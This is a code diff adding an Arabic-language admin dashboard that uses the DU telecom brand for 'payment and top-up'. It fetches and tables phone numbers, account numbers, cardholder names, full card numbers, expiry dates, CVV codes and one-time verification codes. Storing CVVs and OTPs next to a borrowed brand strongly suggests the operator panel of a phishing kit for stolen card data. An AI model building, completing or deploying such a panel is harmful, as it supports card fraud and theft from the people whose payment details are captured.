@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة التحكم - DU للدفع وشحن الرصيد</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            width: 100%;
+        }
+        
+        header {
+            background-color: #fff;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 15px 0;
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            width: 80px;
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+        }
+        
+        .user-name {
+            margin-left: 15px;
+            font-weight: 500;
+        }
+        
+        .logout-btn {
+            background-color: #f44336;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background-color 0.3s ease;
+        }
+        
+        .logout-btn:hover {
+            background-color: #d32f2f;
+        }
+        
+        .main-content {
+            flex-grow: 1;
+            padding: 40px 0;
+        }
+        
+        .dashboard-title {
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #ddd;
+            margin-bottom: 20px;
+        }
+        
+        .tab {
+            padding: 12px 20px;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.3s ease;
+            font-weight: 500;
+        }
+        
+        .tab.active {
+            border-bottom: 2px solid #4285f4;
+            color: #4285f4;
+        }
+        
+        .tab:hover {
+            background-color: #f9f9f9;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+            background-color: #fff;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        
+        .data-table th, .data-table td {
+            padding: 12px 15px;
+            text-align: right;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .data-table th {
+            background-color: #f2f2f2;
+            font-weight: 600;
+        }
+        
+        .data-table tr:last-child td {
+            border-bottom: none;
+        }
+        
+        .data-table tr:hover {
+            background-color: #f9f9f9;
+        }
+        
+        .data-count {
+            margin-bottom: 15px;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .refresh-btn {
+            background: linear-gradient(to right, #6a3de8, #4285f4);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+        
+        .refresh-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        
+        .no-data {
+            text-align: center;
+            padding: 30px;
+            color: #666;
+            font-style: italic;
+        }
+        
+        footer {
+            background-color: #1a1a1a;
+            color: #fff;
+            padding: 30px 0;
+            margin-top: auto;
+        }
+        
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .footer-links a {
+            color: #ddd;
+            margin-left: 20px;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        .footer-links a:hover {
+            color: #fff;
+        }
+        
+        @media (max-width: 768px) {
+            .footer-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .footer-links {
+                margin-top: 20px;
+            }
+            
+            .footer-links a {
+                margin: 0 10px;
+            }
+            
+            .tabs {
+                flex-wrap: wrap;
+            }
+            
+            .tab {
+                flex-grow: 1;
+                text-align: center;
+            }
+            
+            .data-table {
+                display: block;
+                overflow-x: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <a href="index.html">
+                <img src="https://tvsumlhu.manus.space/assets/du-logo.png" alt="DU Logo" class="logo">
+            </a>
+            <div class="user-info">
+                <span class="user-name" id="user-name">مرحباً، المدير</span>
+                <button class="logout-btn" id="logout-btn">تسجيل الخروج</button>
+            </div>
+        </div>
+    </header>
+    
+    <main class="main-content">
+        <div class="container">
+            <div class="dashboard-title">
+                <h1>لوحة تحكم DU للدفع وشحن الرصيد</h1>
+                <p style="color: #666; margin-top: 10px;">عرض وإدارة جميع البيانات المخزنة</p>
+            </div>
+            
+            <button class="refresh-btn" id="refresh-btn">تحديث البيانات</button>
+            
+            <div class="tabs">
+                <div class="tab active" data-tab="phones">أرقام الهواتف</div>
+                <div class="tab" data-tab="cards">بيانات البطاقات</div>
+                <div class="tab" data-tab="verification-codes">رموز التحقق</div>
+                <div class="tab" data-tab="base-numbers">الأرقام الأساسية</div>
+            </div>
+            
+            <div class="tab-content active" id="phones-content">
+                <div class="data-count" id="phones-count">عدد السجلات: <span>0</span></div>
+                <div class="table-container">
+                    <table class="data-table" id="phones-table">
+                        <thead>
+                            <tr>
+                                <th>الرقم</th>
+                                <th>رقم الهاتف</th>
+                                <th>رقم الحساب</th>
+                                <th>المبلغ</th>
+                                <th>طريقة الدفع</th>
+                                <th>رقم المعاملة</th>
+                                <th>التاريخ والوقت</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <!-- سيتم ملء البيانات هنا عبر JavaScript -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            
+            <div class="tab-content" id="cards-content">
+                <div class="data-count" id="cards-count">عدد السجلات: <span>0</span></div>
+                <div class="table-container">
+                    <table class="data-table" id="cards-table">
+                        <thead>
+                            <tr>
+                                <th>الرقم</th>
+                                <th>اسم حامل البطاقة</th>
+                                <th>رقم البطاقة</th>
+                                <th>تاريخ الانتهاء</th>
+                                <th>رمز الأمان</th>
+                                <th>رقم المعاملة</th>
+                                <th>التاريخ والوقت</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <!-- سيتم ملء البيانات هنا عبر JavaScript -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            
+            <div class="tab-content" id="verification-codes-content">
+                <div class="data-count" id="verification-codes-count">عدد السجلات: <span>0</span></div>
+                <div class="table-container">
+                    <table class="data-table" id="verification-codes-table">
+                        <thead>
+                            <tr>
+                                <th>الرقم</th>
+                                <th>رمز التحقق</th>
+                                <th>رقم المعاملة</th>
+                                <th>نوع التحقق</th>
+                                <th>التاريخ والوقت</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <!-- سيتم ملء البيانات هنا عبر JavaScript -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            
+            <div class="tab-content" id="base-numbers-content">
+                <div class="data-count" id="base-numbers-count">عدد السجلات: <span>0</span></div>
+                <div class="table-container">
+                    <table class="data-table" id="base-numbers-table">
+                        <thead>
+                            <tr>
+                                <th>الرقم</th>
+                                <th>الرقم الأساسي</th>
+                                <th>قبول الطلب</th>
+                                <th>مشاركة المعلومات</th>
+                                <th>رقم المعاملة</th>
+                                <th>التاريخ والوقت</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <!-- سيتم ملء البيانات هنا عبر JavaScript -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </main>
+    
+    <footer>
+        <div class="container footer-content">
+            <div class="copyright">
+                &copy; 2025 DU. جميع الحقوق محفوظة.
+            </div>
+            <div class="footer-links">
+                <a href="#">الشروط والأحكام</a>
+                <a href="#">سياسة الخصوصية</a>
+                <a href="#">اتصل بنا</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // التحقق من حالة تسجيل الدخول
+        function checkAuth() {
+            fetch('/api/admin/check-auth')
+            .then(response => response.json())
+            .then(data => {
+                if (!data.logged_in) {
+                    // إعادة التوجيه إلى صفحة تسجيل الدخول
+                    window.location.href = 'admin_login.html';
+                } else {
+                    // عرض اسم المستخدم
+                    document.getElementById('user-name').textContent = 'مرحباً، ' + data.username;
+                    // تحميل البيانات
+                    loadData();
+                }
+            })
+            .catch(error => {
+                console.error('خطأ في التحقق من حالة تسجيل الدخول:', error);
+                window.location.href = 'admin_login.html';
+            });
+        }
+        
+        // تحميل البيانات من قاعدة البيانات
+        function loadData() {
+            fetch('/api/get-all-data')
+            .then(response => response.json())
+            .then(data => {
+                // عرض بيانات الهواتف
+                displayPhones(data.phones);
+                
+                // عرض بيانات البطاقات
+                displayCards(data.cards);
+                
+                // عرض رموز التحقق
+                displayVerificationCodes(data.verification_codes);
+                
+                // عرض الأرقام الأساسية
+                displayBaseNumbers(data.base_numbers);
+            })
+            .catch(error => {
+                console.error('خطأ في تحميل البيانات:', error);
+            });
+        }
+        
+        // عرض بيانات الهواتف
+        function displayPhones(phones) {
+            const tableBody = document.querySelector('#phones-table tbody');
+            const countElement = document.querySelector('#phones-count span');
+            
+            // تحديث عدد السجلات
+            countElement.textContent = phones.length;
+            
+            // مسح البيانات السابقة
+            tableBody.innerHTML = '';
+            
+            if (phones.length === 0) {
+                // عرض رسالة في حالة عدم وجود بيانات
+                const row = document.createElement('tr');
+                row.innerHTML = '<td colspan="7" class="no-data">لا توجد بيانات متاحة</td>';
+                tableBody.appendChild(row);
+                return;
+            }
+            
+            // إضافة البيانات إلى الجدول
+            phones.forEach(phone => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${phone.id}</td>
+                    <td>${phone.phone_number}</td>
+                    <td>${phone.account_number}</td>
+                    <td>${phone.amount}</td>
+                    <td>${phone.payment_method}</td>
+                    <td>${phone.transaction_number}</td>
+                    <td>${phone.timestamp}</td>
+                `;
+                tableBody.appendChild(row);
+            });
+        }
+        
+        // عرض بيانات البطاقات
+        function displayCards(cards) {
+            const tableBody = document.querySelector('#cards-table tbody');
+            const countElement = document.querySelector('#cards-count span');
+            
+            // تحديث عدد السجلات
+            countElement.textContent = cards.length;
+            
+            // مسح البيانات السابقة
+            tableBody.innerHTML = '';
+            
+            if (cards.length === 0) {
+                // عرض رسالة في حالة عدم وجود بيانات
+                const row = document.createElement('tr');
+                row.innerHTML = '<td colspan="7" class="no-data">لا توجد بيانات متاحة</td>';
+                tableBody.appendChild(row);
+                return;
+            }
+            
+            // إضافة البيانات إلى الجدول
+            cards.forEach(card => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${card.id}</td>
+                    <td>${card.card_holder}</td>
+                    <td>${card.card_number}</td>
+                    <td>${card.expiry_date}</td>
+                    <td>${card.cvv}</td>
+                    <td>${card.transaction_number}</td>
+                    <td>${card.timestamp}</td>
+                `;
+                tableBody.appendChild(row);
+            });
+        }
+        
+        // عرض رموز التحقق
+        function displayVerificationCodes(codes) {
+            const tableBody = document.querySelector('#verification-codes-table tbody');
+            const countElement = document.querySelector('#verification-codes-count span');
+            
+            // تحديث عدد السجلات
+            countElement.textContent = codes.length;
+            
+            // مسح البيانات السابقة
+            tableBody.innerHTML = '';
+            
+            if (codes.length === 0) {
+                // عرض رسالة في حالة عدم وجود بيانات
+                const row = document.createElement('tr');
+                row.innerHTML = '<td colspan="5" class="no-data">لا توجد بيانات متاحة</td>';
+                tableBody.appendChild(row);
+                return;
+            }
+            
+            // إضافة البيانات إلى الجدول
+            codes.forEach(code => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${code.id}</td>
+                    <td>${code.verification_code}</td>
+                    <td>${code.transaction_number}</td>
+                    <td>${code.verification_type}</td>
+                    <td>${code.timestamp}</td>
+                `;
+                tableBody.appendChild(row);
+            });
+        }
+        
+        // عرض الأرقام الأساسية
+        function displayBaseNumbers(numbers) {
+            const tableBody = document.querySelector('#base-numbers-table tbody');
+            const countElement = document.querySelector('#base-numbers-count span');
+            
+            // تحديث عدد السجلات
+            countElement.textContent = numbers.length;
+            
+            // مسح البيانات السابقة
+            tableBody.innerHTML = '';
+            
+            if (numbers.length === 0) {
+                // عرض رسالة في حالة عدم وجود بيانات
+                const row = document.createElement('tr');
+                row.innerHTML = '<td colspan="6" class="no-data">لا توجد بيانات متاحة</td>';
+                tableBody.appendChild(row);
+                return;
+            }
+            
+            // إضافة البيانات إلى الجدول
+            numbers.forEach(number => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${number.id}</td>
+                    <td>${number.base_number}</td>
+                    <td>${number.accept_request ? 'نعم' : 'لا'}</td>
+                    <td>${number.share_info ? 'نعم' : 'لا'}</td>
+                    <td>${number.transaction_number}</td>
+                    <td>${number.timestamp}</td>
+                `;
+                tableBody.appendChild(row);
+            });
+        }
+        
+        // تبديل التبويبات
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                // إزالة الفئة النشطة من جميع التبويبات
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                
+                // إضافة الفئة النشطة إلى التبويب المحدد
+                this.classList.add('active');
+                document.getElementById(`${this.dataset.tab}-content`).classList.add('active');
+            });
+        });
+        
+        // تحديث البيانات
+        document.getElementById('refresh-btn').addEventListener('click', loadData);
+        
+        // تسجيل الخروج
+        document.getElementById('logout-btn').addEventListener('click', function() {
+            fetch('/api/admin/logout', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    window.location.href = 'admin_login.html';
+                }
+            })
+            .catch(error => {
+                console.error('خطأ في تسجيل الخروج:', error);
+            });
+        });
+        
+        // التحقق من حالة تسجيل الدخول عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', checkAuth);
+    </script>
+</body>
+</html>
